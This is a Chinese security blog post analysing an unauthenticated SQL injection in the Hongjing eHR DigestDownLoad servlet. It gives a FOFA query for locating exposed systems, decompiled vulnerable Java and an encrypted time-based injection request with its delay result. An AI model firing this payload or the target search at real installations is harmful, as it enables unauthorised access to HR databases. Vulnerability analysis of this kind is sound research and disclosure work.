---
title: "宏景人力资源管理系统 DigestDownLoad SQL注入漏洞"
source: https://mrxn.net/jswz/hjsoft-DigestDownLoad-sqli.html
asset_dir: assets/宏景人力资源管理系统-digestdownload-sql注入漏洞
---

# 宏景人力资源管理系统 DigestDownLoad SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/18 08:24
- 1669浏览
- [0评论](#comment)
- 35分钟阅读

深入探索

计算机安全

人力资源管理系统

授权

---

# 漏洞简介

宏景[人力资源管理系统](#)（eHR）是一款由宏景[软件](#)研发的系统。宏景人力资源管理系统的 `DigestDownLoad` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

商务软件和生产力软件

# 影响版本

# fofa语法

> `app="HJSOFT-HCM"`

# 漏洞分析

根据 `WEB-INF/web.xml` 中对 `DigestDownLoad` 的定义如下

```
<servlet-mapping>
  <servlet-name>DigestDownLoad</servlet-name>
  <url-pattern>/servlet/DigestDownLoad</url-pattern>
</servlet-mapping>
<servlet>
  <servlet-name>DigestDownLoad</servlet-name>
  <servlet-class>com.hjsj.hrms.servlet.lawbase.DigestDownLoad</servlet-class>
</servlet>
```

跟进 `com.hjsj.hrms.servlet.lawbase.DigestDownLoad` 类

深入探索

VPN服务

传输层安全性协议

安全研究工具

```
public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
        String var3 = var1.getParameter("id");
        var3 = PubFunc.decrypt(SafeCode.decode(var3));
        String var4 = var1.getParameter("type");
        if (var4 == null) {
            var4 = "";
        }
```

首先规定请求方法为 GET ,获取的两个参数 id、type ，需要对 id 进行解码以及解密，可以使用DecryptTools工具或者[我写的](https://mrxn.net/jswz/714.html)直接编码加密即可，解码与解密方法如下

SQL注入防护

```
public static final String decode(String var0) {
    if (var0 == null) {
        return "";
    } else {
        String var1 = "";

        for(int var2 = 0; var2 < var0.length(); ++var2) {
            char var3;
            switch (var3 = var0.charAt(var2)) {
                case '^':
                    String var5 = var0.substring(var2 + 1, var2 + 4 + 1);
                    var1 = var1 + (char)Integer.parseInt(var5, 16);
                    var2 += 4;
                    break;
                case '~':
                    String var4 = var0.substring(var2 + 1, var2 + 4 - 1);
                    var1 = var1 + (char)Integer.parseInt(var4, 16);
                    var2 += 2;
                    break;
                default:
                    var1 = var1 + var3;
            }
        }

        return var1;
    }
}
```

深入探索

SQL注入检测工具

漏洞修复方案

在线安全工具

```
public static String decrypt(String var0) {
        if (null == var0) {
            return "";
        } else {
            var0 = var0.replaceAll("PAATTP", "@");
            var0 = var0.replaceAll("@2HJ5@", "%");
            var0 = var0.replaceAll("@2HJB@", "\\+");
            var0 = var0.replaceAll("@2HJ0@", " ");
            var0 = var0.replaceAll("@2HJF@", "\\/");
            var0 = var0.replaceAll("@3HJF@", "\\?");
            var0 = var0.replaceAll("@2HJ3@", "#");
            var0 = var0.replaceAll("@2HJ6@", "&");
            var0 = var0.replaceAll("@3HJD@", "=");
            String var1 = SafeCode.decrypt(var0);
            return var1;
        }
    }
```

当 `var4=original` 时，执行以下处理逻辑

代码安全审计

```
var5 = var7.createStatement();
String var12 = "";
if (var4.equalsIgnoreCase("original")) {
    String var13 = "select name,digest,originalfile from law_base_file where file_id = '" + var3 + "'";
    var10.open(var7, var13);
    var6 = var5.executeQuery(var13);
} else {
    String var30 = "select name,digest,content from law_base_file where file_id = '" + var3 + "'";
    var10.open(var7, var30);
    var6 = var5.executeQuery(var30);
}
```

否则执行 else 部分，而两处的处理里对于 var3 都没有任何过滤或校验，被直接拼接进sql语句中执行，造成[SQL注入漏](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

[漏洞利用](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)使用 `1'waitfor delay'0:0:5'--` 加密编码后来测试

漏洞扫描服务

```
GET /servlet/DigestDownLoad?id=SPAATTP~32HJFPAATTPJPAATTP~32HJFPAATTPHNvno~33W~39Sm~33WBgDEqPAATTP~32HJFPAATTPWzCGPAATTP~32HJBPAATTPS~30TBXpcPpPAATTP~32HJFPAATTP~37~39l~37h~38PAATTP~33HJDPAATTP HTTP/1.1
Host: hjsoft.mrxn.net
```

[![宏景人力资源管理系统 DigestDownLoad SQL注入漏洞](images/img-001-7f29566f3001.webp)](https://image.mrxn.net/8e724abd1acf4e8bac05b8da49bc4134.webp)

成功延时 5 秒

不编码，直接使用加密后的payload也是可以的

> SPAATTP2HJFPAATTPJPAATTP2HJFPAATTPHNvno3W9Sm3WBgDEqPAATTP2HJFPAATTPWzCGPAATTP2HJBPAATTPS0TBXpcPpPAATTP2HJFPAATTP79l7h8PAATTP3HJDPAATTP

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
